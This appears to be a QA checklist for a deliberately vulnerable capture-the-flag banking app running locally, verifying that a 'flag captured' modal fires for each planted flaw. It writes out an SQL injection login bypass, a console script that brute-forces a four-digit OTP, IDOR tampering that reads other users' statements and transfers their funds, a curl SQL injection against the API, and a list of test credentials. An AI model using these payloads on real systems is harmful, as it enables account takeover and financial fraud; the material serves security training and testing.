# Flag Modal Vulnerabilities - Complete Test List

**Status:** Ready for verification  
**Environment:** http://localhost:9443

---

## ✅ **Test 1: auth.g1 — SQL Injection (Login)**

**Description:** Bypass login with SQL injection in Customer ID field

**Steps:**
1. Go to `/login`
2. Enter:
   - Customer ID: `BS100234' or '1'='1`
   - Password: `anything`
3. Click "Sign In"

**Expected:**
- Modal appears with 🚩 FLAG CAPTURED!
- Flag text: `BANKSPLOIT{...}`
- Must COPY flag before OK button enables
- Click OK → OTP form appears
- Enter OTP from `/otp-inbox` → Redirect to Dashboard
- Logged in as BS100234

**Flag Returns Via:** Response header `X-CTF-Flag`

---

## ✅ **Test 2: auth.l10 — OTP Brute Force (No Rate Limit)**

**Description:** Brute-force OTP without rate limiting

**Steps:**
1. Go to `/login`
2. Enter valid credentials:
   - Customer ID: `BS100234`
   - Password: `password123`
3. Click "Sign In"
4. OTP form appears
5. Open DevTools (F12) → Console
6. Run brute-force script:
```javascript
async function bruteForceOTP() {
    const csrfToken = document.querySelector('input[name="csrf_token"]').value;
    for(let i = 0; i <= 9999; i++) {
        const otp = String(i).padStart(4, '0');
        const response = await fetch('/login', {
            method: 'POST',
            body: new URLSearchParams({
                otp: otp,
                csrf_token: csrfToken
            })
        });
        const flag = response.headers.get('X-CTF-Flag');
        if(flag) {
            console.log('✅ Found correct OTP:', otp, 'Flag:', flag);
            break;
        }
    }
}
bruteForceOTP();
```

**Expected:**
- Script finds correct OTP rapidly (no rate limiting)
- Modal appears with flag on successful OTP
- Must copy before OK enables
- Redirects to Dashboard

**Flag Returns Via:** Response header `X-CTF-Flag`

---

## ✅ **Test 3: statements.l1 — IDOR (Account Statements)**

**Description:** Access other users' account statements via account_id parameter

**Steps:**
1. Login with:
   - Customer ID: `BS100234`
   - Password: `password123`
2. Verify OTP → Dashboard
3. Go to **Statements** page
4. Current URL should be: `/statements?account_id=1` (or similar)
5. Change to: `/statements?account_id=4` (another user's account)
6. Press Enter/navigate

**Expected:**
- Page loads with another user's statements
- Modal appears with 🚩 FLAG CAPTURED!
- Must copy flag before OK enables
- Click OK → Page reloads showing IDOR data
- Modal closes

**Flag Returns Via:** Response header `X-CTF-Flag`

---

## ✅ **Test 4: transfer.l1 — IDOR (Fund Transfer)**

**Description:** Transfer funds from another user's account via IDOR

**Steps:**
1. Login with:
   - Customer ID: `BS100234`
   - Password: `password123`
2. Verify OTP → Dashboard
3. Go to **Transfer** page
4. Open DevTools (F12) → Console
5. Modify the source account to another user:
```javascript
document.querySelector('input[name="from_account_id"]').value = 4;
```
6. Fill transfer form:
   - To Account: `2` (or any valid account)
   - Amount: `100`
   - Description: `Test`
7. Click "Submit Transfer"
8. May need to verify OTP again

**Expected:**
- Transfer succeeds using another user's account (IDOR)
- Modal appears with 🚩 FLAG CAPTURED!
- Must copy flag before OK enables
- Click OK → Redirects to confirmation/dashboard
- Modal closes

**Flag Returns Via:** Response header `X-CTF-Flag` (HTML form) + `ctf_flag` field (JSON API)

---

## ✅ **Test 5: auth.g1 (API) — SQL Injection (REST API)**

**Description:** SQL injection in REST API login endpoint

**Steps:**
1. Open any tab with the app already open (or keep it open in background)
2. Open terminal/PowerShell/Command Prompt
3. Run:
```bash
curl -X POST http://localhost:9443/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"customer_id\":\"' OR '1'='1\",\"password\":\"test\"}"
```

**Expected:**
- Response includes `"ctf_flag": "BANKSPLOIT{...}"`
- If browser has app open: Modal appears in browser with flag
- Console shows: "Flag found in JSON body: BANKSPLOIT{...}"

**Flag Returns Via:** JSON response body field `ctf_flag`

---

## 📋 Test Accounts Available

```
BS100234 | Rahul Sharma    | password123
BS100235 | Priya Menon     | priya@123
BS100236 | Vikram Singh    | vikram@123
BS100237 | Aditya Rao      | aditya@123
BS100238 | Ankit Kumar     | 1234
ADMIN001 | Admin User      | admin@123
```

---

## Modal Behavior Checklist

For EACH vulnerability test, verify:

- [ ] Modal appears automatically
- [ ] 🚩 FLAG CAPTURED! heading shows
- [ ] Flag text displays correctly
- [ ] Copy button is ACTIVE (can click)
- [ ] OK button is DISABLED initially (greyed out)
- [ ] Click Copy → Flag copied to clipboard
- [ ] OK button becomes ENABLED after copy
- [ ] X button in top right closes modal immediately
- [ ] OK button closes modal
- [ ] After closing → page continues normal flow
- [ ] No console errors
- [ ] Modal doesn't auto-hide (only closes on user action)

---

## Quick Test Matrix

| Test # | Vulnerability | Status | Notes |
|--------|---|--------|-------|
| 1 | auth.g1 (SQLi Login) | ⬜ | |
| 2 | auth.l10 (OTP Brute) | ⬜ | |
| 3 | statements.l1 (IDOR) | ⬜ | |
| 4 | transfer.l1 (IDOR) | ⬜ | |
| 5 | auth.g1 (API SQLi) | ⬜ | |

**Legend:** ⬜ = Not tested | ✅ = Pass | ❌ = Fail

---

## Report Format

For each test, report:
```
**Test #: [Name]**
- Status: ✅ PASS / ❌ FAIL
- Modal appears: Yes/No
- Flag copies: Yes/No
- OK enables: Yes/No
- Redirect works: Yes/No
- Issues: [Any errors or problems]
```

